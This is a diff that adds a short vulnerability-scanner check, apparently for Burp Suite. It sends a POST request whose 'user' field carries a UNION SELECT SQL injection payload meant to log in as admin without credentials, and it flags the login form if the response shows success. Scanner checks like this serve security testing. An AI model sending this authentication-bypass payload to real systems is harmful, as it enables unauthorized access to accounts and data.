@@ -1,0 +1,26 @@
+metadata:
+	language: v1-beta
+	name: "SQLi_Auth_Injection"
+	author: "nu11secur1ty"
+	description: "SQLi_Auth-check"
+	tags: "SQLi_Bypass_Authentication"
+
+define:
+    potential_path = "/*.php"
+
+given host then
+    send request called check:
+		method: "POST"
+		replacing headers:
+			"Content-Type": "application/x-www-form-urlencoded",
+			"Accept": "*/*"
+		path: {potential_path}
+		body: "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
+
+			if {check.response.status_code} is "200" and "\"success\":true" in {check.response.body} and "_vm_version" in {check.response.body} and "_debug" in {check.response.body} then
+					report issue:
+						severity: high
+						confidence: certain
+						detail: "A SQL bypass authentication injection vulnerability detected in the login form.."
+						remediation: "Please check it manually."
+			end if
